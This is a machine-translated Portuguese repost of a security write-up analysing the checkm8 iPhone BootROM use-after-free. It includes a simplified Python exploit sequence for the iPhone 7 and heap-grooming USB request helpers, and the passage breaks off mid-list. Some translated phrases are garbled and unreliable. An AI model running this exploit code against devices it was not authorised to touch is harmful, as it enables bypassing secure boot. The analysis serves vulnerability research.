<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö∂ üòå üç£ An√°lise t√©cnica da explora√ß√£o checkm8 ‚ú≥Ô∏è üé∫ üë©üèº‚Äçüé®</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Provavelmente voc√™ j√° ouviu falar sobre o famoso exploit checkm8 , que usa uma vulnerabilidade n√£o BootROM no BootROM da maioria dos iDevices, incluin...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>An√°lise t√©cnica da explora√ß√£o checkm8</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> Provavelmente voc√™ j√° ouviu falar sobre o famoso exploit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">checkm8</a> , que usa uma vulnerabilidade n√£o <code>BootROM</code> no <code>BootROM</code> da maioria dos iDevices, incluindo o <code>iPhone X</code>  Neste artigo, forneceremos uma an√°lise t√©cnica dessa explora√ß√£o e descobriremos o que causa a vulnerabilidade. </p><a name="habracut"></a><br><p>  Voc√™ pode ler a vers√£o em russo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . </p><br><h2 id="introduction">  1. Introdu√ß√£o </h2><br><p>  Primeiro, vamos descrever brevemente o processo de inicializa√ß√£o de um iDevice e o papel que o <code>BootROM</code> (tamb√©m conhecido como <code>SecureROM</code> ) desempenha nele.  Informa√ß√µes detalhadas sobre o assunto podem ser encontradas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> .  Veja como √© a inicializa√ß√£o: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  Quando o dispositivo est√° ligado, o <code>BootROM</code> √© executado primeiro.  Suas principais tarefas s√£o: </p><br><ul><li>  Inicializa√ß√£o da plataforma (os registros necess√°rios da plataforma est√£o instalados, a <code>CPU</code> √© inicializada etc.) </li><li>  Verifica√ß√£o e transfer√™ncia de controle para a pr√≥xima etapa <br><ul><li>  <code>BootROM</code> suporta a an√°lise de imagens <code>IMG3/IMG4</code> </li><li>  <code>BootROM</code> tem acesso √† chave <code>GID</code> para descriptografar imagens </li><li>  para verifica√ß√£o de imagem, o <code>BootROM</code> possui uma chave p√∫blica da <code>Apple</code> incorporada e a funcionalidade criptogr√°fica necess√°ria </li></ul></li><li>  Restaure o dispositivo se n√£o for poss√≠vel inicializar mais ( <code>Device Firmware Update</code> , <code>DFU</code> ). </li></ul><br><p>  <code>BootROM</code> tem um tamanho muito pequeno e pode ser chamado de uma vers√£o leve do <code>iBoot</code> , pois eles compartilham a maior parte do c√≥digo do sistema e da biblioteca.  Embora, diferentemente do <code>iBoot</code> , o <code>BootROM</code> n√£o possa ser atualizado.  Ele √© colocado na mem√≥ria interna somente leitura quando um dispositivo √© fabricado.  <code>BootROM</code> √© a raiz de confian√ßa de hardware da cadeia de inicializa√ß√£o segura.  <code>BootROM</code> vulnerabilidades do <code>BootROM</code> podem permitir que um invasor controle o processo de inicializa√ß√£o e execute o c√≥digo n√£o assinado em um dispositivo. </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8">  A hist√≥ria do checkm8 </h2><br><p>  O exploit <code>checkm8</code> foi adicionado ao <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ipwndfu</a> pelo seu autor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">axi0mX</a> em 27 de setembro de 2019. Ao mesmo tempo, ele <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">anunciou</a> a atualiza√ß√£o no Twitter e forneceu uma descri√ß√£o e informa√ß√µes adicionais sobre o exploit.  De acordo com o t√≥pico, ele encontrou a vulnerabilidade de <code>use-after-free</code> no c√≥digo <code>USB</code> , enquanto o patch <code>iBoot</code> para <code>iOS 12 beta</code> no ver√£o de 2018. <br>  <code>BootROM</code> e o <code>iBoot</code> compartilham a maior parte de seu c√≥digo, incluindo <code>USB</code> , portanto, essa vulnerabilidade tamb√©m √© relevante para o <code>BootROM</code> . </p><br><p>  Como se segue no c√≥digo da explora√ß√£o, a vulnerabilidade √© explorada no <code>DFU</code> .  Este √© um modo no qual √© poss√≠vel transferir uma imagem assinada para um dispositivo via <code>USB</code> que ser√° inicializado mais tarde.  Por exemplo, isso pode ser √∫til para restaurar um dispositivo ap√≥s uma atualiza√ß√£o sem √™xito. </p><br><p>  No mesmo dia, o usu√°rio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">littlelailo</a> disse que havia encontrado a vulnerabilidade em mar√ßo e publicou uma descri√ß√£o em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">apollo.txt</a> .  A descri√ß√£o correspondeu ao <code>checkm8</code> , embora nem todos os detalhes da explora√ß√£o fiquem claros ap√≥s a leitura.  Por isso, decidimos escrever este artigo e descrever todos os detalhes da explora√ß√£o at√© a execu√ß√£o da carga no <code>BootROM</code> . </p><br><p>  <code>iBoot/SecureROM</code> nossa an√°lise da explora√ß√£o nos recursos mencionados acima e no c√≥digo-fonte do <code>iBoot/SecureROM</code> , que vazou em fevereiro de 2018. Tamb√©m usamos os dados que obtivemos das experi√™ncias realizadas em nosso dispositivo de teste, o <code>iPhone 7</code> ( <code>CPID:8010</code> )  Usando <code>checkm8</code> , obtivemos os despejos do <code>SecureROM</code> e <code>SecureRAM</code> , que tamb√©m foram √∫teis para a an√°lise. </p><br><h2 id="necessary-info-about-usb">  Informa√ß√µes necess√°rias sobre USB </h2><br><p>  Como a vulnerabilidade est√° no c√≥digo <code>USB</code> , √© necess√°rio entender como essa interface funciona.  Especifica√ß√µes completas podem ser encontradas em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://www.usb.org/</a> , mas √© uma leitura longa.  Para nossos prop√≥sitos, o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">USB no NutShell</a> √© mais que suficiente.  Aqui, mencionaremos apenas os pontos mais relevantes. </p><br><p>  Existem v√°rios tipos de transfer√™ncia de dados <code>USB</code> .  No <code>DFU</code> , apenas <code>Control Transfers</code> modo <code>Control Transfers</code> √© usado (leia mais sobre isso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> ).  Nesse modo, cada transa√ß√£o possui 3 est√°gios: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - um pacote de <code>SETUP</code> √© enviado;  possui os seguintes campos: <br><ul><li>  <code>bmRequestType</code> - define a dire√ß√£o da solicita√ß√£o, seu tipo e o destinat√°rio </li><li>  <code>bRequest</code> - define a solicita√ß√£o a ser feita </li><li>  <code>wValue</code> , <code>wIndex</code> - s√£o interpretados dependendo da solicita√ß√£o </li><li>  <code>wLength</code> - especifica o tamanho dos dados enviados / recebidos no <code>Data Stage</code> </li></ul></li><li>  <code>Data Stage</code> - um est√°gio opcional de transfer√™ncia de dados.  Dependendo do pacote <code>SETUP</code> enviado durante o <code>Setup Stage</code> , os dados podem ser enviados do host para o dispositivo ( <code>OUT</code> ) ou vice-versa ( <code>IN</code> ).  Os dados s√£o enviados em pequenas por√ß√µes (no caso do <code>Apple DFU</code> , s√£o 0x40 bytes). <br><ul><li>  Quando um host deseja enviar outra parte dos dados, ele envia um token <code>OUT</code> e depois os pr√≥prios dados. </li><li>  Quando um host est√° pronto para receber dados de um dispositivo, ele envia um token <code>IN</code> para o dispositivo. </li></ul></li><li>  <code>Status Stage</code> - o √∫ltimo est√°gio;  o status de toda a transa√ß√£o √© relatado. <br><ul><li>  Para solicita√ß√µes de <code>OUT</code> , o host envia um token de entrada ao qual o dispositivo deve responder com um pacote de tamanho zero. </li><li>  Para solicita√ß√µes <code>IN</code> , o host envia um token <code>OUT</code> e um pacote de tamanho zero. </li></ul></li></ul><br><p>  O esquema abaixo mostra as solicita√ß√µes <code>OUT</code> e <code>IN</code> .  Tiramos o <code>ACK</code> , <code>NACK</code> e outros pacotes de handshake de prop√≥sito, pois eles n√£o s√£o importantes para a explora√ß√£o em si. </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt">  An√°lise de apollo.txt </h2><br><p>  Iniciamos a an√°lise com a vulnerabilidade do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">apollo.txt</a> .  O documento descreve o algoritmo do modo <code>DFU</code> : </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  Quando o usb √© iniciado para obter uma imagem atrav√©s do dfu, o dfu registra uma interface para lidar com todos os comandos e aloca um buffer para entrada e sa√≠da </li><li>  Se voc√™ enviar dados para o dfu, o pacote de instala√ß√£o √© tratado pelo c√≥digo principal, que ent√£o chama o c√≥digo da interface </li><li>  o c√≥digo da interface verifica se wLength √© menor que o tamanho do buffer de sa√≠da e, se for o caso, atualiza um ponteiro passado como argumento com um ponteiro para o buffer de sa√≠da. </li><li>  em seguida, retorna wLength, que √© o comprimento que deseja receber no buffer </li><li>  o c√≥digo principal usb atualiza uma var global com o comprimento e se prepara para receber os pacotes de dados </li><li>  se um pacote de dados √© recebido, ele √© gravado no buffer de sa√≠da de entrada por meio do ponteiro que foi passado como argumento e outra vari√°vel global √© usada para acompanhar quantos bytes j√° foram recebidos </li><li>  se todos os dados foram recebidos, o c√≥digo espec√≠fico dfu √© chamado novamente e, em seguida, copia o conte√∫do do buffer de sa√≠da para o local da mem√≥ria de onde a imagem √© inicializada posteriormente </li><li>  depois disso, o c√≥digo usb redefine todas as vari√°veis ‚Äã‚Äãe passa a manipular novos pacotes </li><li>  se o dfu sair, o buffer de sa√≠da ser√° liberado e se a an√°lise da imagem falhar, o bootrom reentra no dfu </li></ol><br></blockquote><p>  Primeiro, verificamos essas etapas no c√≥digo fonte do <code>iBoot</code> .  N√£o podemos usar os fragmentos do c√≥digo vazado aqui, portanto, usaremos o pseudoc√≥digo que obtivemos da engenharia reversa do <code>SecureROM</code> do nosso <code>iPhone7</code> na <code>IDA</code> .  Voc√™ pode encontrar facilmente o c√≥digo fonte do <code>iBoot</code> e navegar nele. </p><br><p>  Quando o <code>DFU</code> √© inicializado, um buffer de <code>IO</code> √© alocado e uma interface <code>USB</code> para processar os pedidos para o <code>DFU</code> √© registrada: </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  Quando o pacote <code>SETUP</code> de uma solicita√ß√£o para o <code>DFU</code> chega, um manipulador de interface apropriado √© chamado.  Para solicita√ß√µes de <code>OUT</code> (por exemplo, quando uma imagem √© enviada), em caso de execu√ß√£o bem-sucedida, o manipulador deve retornar o endere√ßo do buffer de <code>IO</code> para a transa√ß√£o, bem como o comprimento dos dados que espera receber.  Ambos os valores s√£o armazenados em vari√°veis ‚Äã‚Äãglobais. </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  A captura de tela abaixo mostra o manipulador da interface <code>DFU</code> .  Se uma solicita√ß√£o estiver correta, o endere√ßo do buffer <code>IO</code> alocado durante a inicializa√ß√£o do <code>DFU</code> e o comprimento esperado dos dados do pacote <code>SETUP</code> ser√£o retornados. </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  Durante o <code>Data Stage</code> , cada parte dos dados √© gravada no buffer de <code>IO</code> e, em seguida, o endere√ßo do buffer de <code>IO</code> √© compensado e o contador recebido √© atualizado.  Quando todos os dados esperados s√£o recebidos, o manipulador de dados da interface √© chamado e o estado global da transa√ß√£o √© limpo. </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  No manipulador de dados <code>DFU</code> , os dados recebidos s√£o movidos para a √°rea de mem√≥ria da qual ser√£o carregados posteriormente.  Com base no c√≥digo fonte do <code>iBoot</code> , essa √°rea nos dispositivos <code>Apple</code> √© chamada <code>INSECURE_MEMORY</code> . </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  Quando o dispositivo sai do modo <code>DFU</code> , o buffer de <code>IO</code> alocado anteriormente √© liberado.  Se a imagem foi adquirida com sucesso no modo <code>DFU</code> , ela ser√° verificada e inicializada.  Se houver algum erro ou for imposs√≠vel inicializar a imagem, o <code>DFU</code> ser√° inicializado novamente e todo o processo ser√° repetido desde o in√≠cio. </p><br><p>  O algoritmo descrito possui uma vulnerabilidade de <code>use-after-free</code> .  Se enviarmos um pacote <code>SETUP</code> no momento do upload da imagem e concluir a transa√ß√£o ignorando o <code>Data Stage</code> , o estado global permanecer√° inicializado durante o pr√≥ximo ciclo do <code>DFU</code> e poderemos gravar no endere√ßo do buffer de <code>IO</code> alocado durante o per√≠odo anterior. itera√ß√£o do <code>DFU</code> . </p><br><p>  Agora que sabemos como <code>use-after-free</code> o <code>use-after-free</code> , a quest√£o √©: como podemos substituir qualquer coisa durante a pr√≥xima itera√ß√£o do <code>DFU</code> ?  Antes de outra inicializa√ß√£o do <code>DFU</code> , todos os recursos alocados anteriormente s√£o liberados e a aloca√ß√£o de mem√≥ria em uma nova itera√ß√£o deve ser exatamente a mesma.  Como se viu, h√° outro erro interessante de vazamento de mem√≥ria que permite explorar o <code>use-after-free</code> . </p><br><h2 id="analysis-of-checkm8">  An√°lise do checkm8 </h2><br><p>  Vamos ao pr√≥prio <code>checkm8</code> .  Para fins de demonstra√ß√£o, usaremos uma vers√£o simplificada da explora√ß√£o para o <code>iPhone 7</code> , onde retiramos todo o c√≥digo relacionado a outras plataformas e alteramos a ordem e os tipos de solicita√ß√µes de <code>USB</code> sem danificar sua funcionalidade.  Tamb√©m nos livramos do processo de cria√ß√£o de uma carga √∫til, que pode ser encontrada no arquivo original, <code>checkm8.py</code> .  √â f√°cil identificar as diferen√ßas entre as vers√µes para outros dispositivos. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  A opera√ß√£o do <code>checkm8</code> possui v√°rios est√°gios: </p><br><ol><li>  Monte feng-shui </li><li>  Aloca√ß√£o e libera√ß√£o do buffer de <code>IO</code> sem limpar o estado global </li><li>  Substituindo <code>usb_device_io_request</code> na pilha com <code>use-after-free</code> </li><li>  Colocando a Carga √ötil </li><li>  Execu√ß√£o da <code>callback-chain</code> de <code>callback-chain</code> de <code>callback-chain</code> </li><li>  Execu√ß√£o de <code>shellcode</code> de <code>shellcode</code> </li></ol><br><p>  Vejamos todas as etapas em detalhes. </p><br><h2 id="1-heap-feng-shui">  1. Monte feng-shui </h2><br><p>  Achamos que √© o est√°gio mais interessante, portanto, gastaremos mais tempo descrevendo-o. </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  Esse est√°gio √© necess√°rio para organizar o heap de uma maneira que seja ben√©fica para a explora√ß√£o do <code>use-after-free</code> .  Primeiro, vamos considerar as chamadas <code>stall</code> , <code>leak</code> , <code>no_leak</code> : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> √© um wrapper para <code>device.ctrlTransfer</code> ignorando todas as exce√ß√µes que surgem durante a execu√ß√£o de uma solicita√ß√£o.  <code>libusb1_async_ctrl_transfer</code> √© um wrapper para a fun√ß√£o <code>libusb_submit_transfer</code> do <code>libusb</code> para a execu√ß√£o ass√≠ncrona de uma requisi√ß√£o. </p><br><p>  Os seguintes par√¢metros s√£o passados ‚Äã‚Äãpara essas chamadas: </p><br><ul><li>  N√∫mero do dispositivo </li><li>  Dados para o pacote <code>SETUP</code> (aqui voc√™ pode encontrar a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">descri√ß√£o</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  Comprimento dos dados ( <code>wLength</code> ) ou dados para o <code>Data Stage</code> </li><li>  Tempo limite da solicita√ß√£o </li></ul><br><p>  Argumentos <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> e <code>wIndex</code> s√£o compartilhados pelos tr√™s tipos de solicita√ß√£o: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - dire√ß√£o do <code>Data Stage</code> de <code>Data Stage</code> (dispositivo para host) </li><li>  <code>0bX00XXXXX</code> - tipo de solicita√ß√£o padr√£o </li><li>  <code>0bXXX00000</code> - o dispositivo √© o destinat√°rio da solicita√ß√£o </li></ul></li><li>  <code>bRequest = 6</code> - solicita√ß√£o para obter um descritor ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - define o tipo do descritor - string ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> - o √≠ndice do descritor de cadeia, 4, corresponde ao n√∫mero de s√©rie do dispositivo (nesse caso, a cadeia √© <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - o identificador do idioma da string, cujo valor n√£o √© relevante para a explora√ß√£o e pode ser alterado. </li></ul><br><p>  Para qualquer uma dessas solicita√ß√µes, 0x30 bytes s√£o alocados no heap para um objeto da seguinte estrutura: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  Os campos mais interessantes desse objeto s√£o <code>callback</code> e <code>next</code> . </p><br><ul><li>  <code>callback</code> √© o ponteiro para a fun√ß√£o que ser√° chamada quando a solicita√ß√£o for conclu√≠da. </li><li>  <code>next</code> √© o ponteiro para o pr√≥ximo objeto do mesmo tipo;  √© necess√°rio para organizar a fila de solicita√ß√µes. </li></ul><br><p>  O principal recurso do <code>stall</code> √© o uso da execu√ß√£o ass√≠ncrona de uma solicita√ß√£o com um tempo limite m√≠nimo.  √â por isso que, se tivermos sorte, a solicita√ß√£o ser√° cancelada no n√≠vel do SO e permanecer√° na fila de execu√ß√£o, e a transa√ß√£o n√£o ser√° conclu√≠da.  Al√©m disso, o dispositivo continuar√° recebendo todos os pacotes <code>SETUP</code> futuros e os colocar√°, quando necess√°rio, na fila de execu√ß√£o.  Mais tarde, experimentando o controlador <code>USB</code> no <code>Arduino</code> , descobrimos que, para uma explora√ß√£o bem-sucedida, precisamos que o host envie um pacote <code>SETUP</code> e um token <code>IN</code> , ap√≥s o qual a transa√ß√£o deve ser cancelada devido ao tempo limite.  Essa transa√ß√£o incompleta se parece com isso: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  Al√©m disso, os pedidos diferem apenas em comprimento por uma unidade.  Para solicita√ß√µes padr√£o, existe um <code>callback</code> padr√£o semelhante a este: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  O valor de <code>io_length</code> √© igual ao m√≠nimo de <code>wLength</code> no pacote <code>SETUP</code> da solicita√ß√£o e o comprimento original do descritor solicitado.  Devido ao descritor ser bastante longo, podemos controlar o valor de <code>io_length</code> dentro de seu comprimento.  O valor de <code>g_setup_request.wLength</code> √© igual ao valor de <code>wLength</code> do √∫ltimo pacote de <code>SETUP</code> .  Nesse caso, √© <code>0xC1</code> . </p><br><p>  Assim, as solicita√ß√µes formadas pelas chamadas <code>stall</code> e <code>leak</code> s√£o conclu√≠das, a condi√ß√£o na fun√ß√£o de <code>callback</code> do terminal √© atendida e <code>usb_core_send_zlp()</code> √© chamado.  Essa chamada cria um pacote nulo (pacote <code>zero-length-packet</code> ) e o adiciona √† fila de execu√ß√£o.  Isso √© necess√°rio para a conclus√£o correta da transa√ß√£o no <code>Status Stage</code> . </p><br><p>  A solicita√ß√£o √© conclu√≠da chamando a fun√ß√£o <code>usb_core_complete_endpoint_io</code> .  Primeiro, ele chama de <code>callback</code> e, em seguida, libera a mem√≥ria da solicita√ß√£o.  A solicita√ß√£o √© conclu√≠da n√£o apenas quando toda a transa√ß√£o √© conclu√≠da, mas tamb√©m quando o <code>USB</code> √© redefinido.  Quando o sinal para redefinir o <code>USB</code> for recebido, todas as solicita√ß√µes na fila de execu√ß√£o ser√£o conclu√≠das. </p><br><p>  Ao chamar seletivamente <code>usb_core_send_zlp()</code> ao passar pela fila de execu√ß√£o e liberar as solicita√ß√µes posteriormente, podemos obter controle suficiente sobre o heap para a explora√ß√£o do <code>use-after-free</code> .  Primeiro, vamos dar uma olhada no loop de limpeza da solicita√ß√£o: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  Como voc√™ pode ver, a fila √© esvaziada e as solicita√ß√µes canceladas s√£o executadas e conclu√≠das por <code>usb_core_complete_endpoint_io</code> .  Os pedidos alocados por <code>usb_core_send_zlp</code> s√£o colocados em <code>ep-&gt;io_head</code> .  Ap√≥s a redefini√ß√£o do <code>USB</code> , todas as informa√ß√µes sobre o terminal ser√£o limpas, incluindo os ponteiros <code>io_head</code> e <code>io_tail</code> , e as solicita√ß√µes de comprimento zero permanecer√£o no heap.  Assim, podemos criar um pequeno peda√ßo no meio da pilha.  O esquema abaixo mostra como √© feito: </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  No monte do <code>SecureROM</code> , uma nova √°rea de mem√≥ria √© alocada a partir do menor peda√ßo livre adequado.  Ao criar um pequeno bloco livre usando o m√©todo descrito acima, podemos controlar a aloca√ß√£o de mem√≥ria durante a inicializa√ß√£o do <code>USB</code> , incluindo a aloca√ß√£o do <code>io_buffer</code> e solicita√ß√µes. </p><br><p>  Para entender melhor isso, vamos ver quais solicita√ß√µes ao heap s√£o feitas quando o <code>DFU</code> √© inicializado.  Durante a an√°lise do c√≥digo fonte do <code>iBoot</code> e a engenharia reversa do <code>SecureROM</code> , obtivemos a seguinte sequ√™ncia: </p><br><ul><li><ol><li>  Aloca√ß√£o de v√°rios descritores de string <br><ul><li>  1.1  <code>Nonce</code> (tamanho <code>234</code> ) </li><li>  1.2  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3  <code>Product</code> ( <code>62</code> ) </li><li>  1.4  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  Aloca√ß√µes relacionadas √† 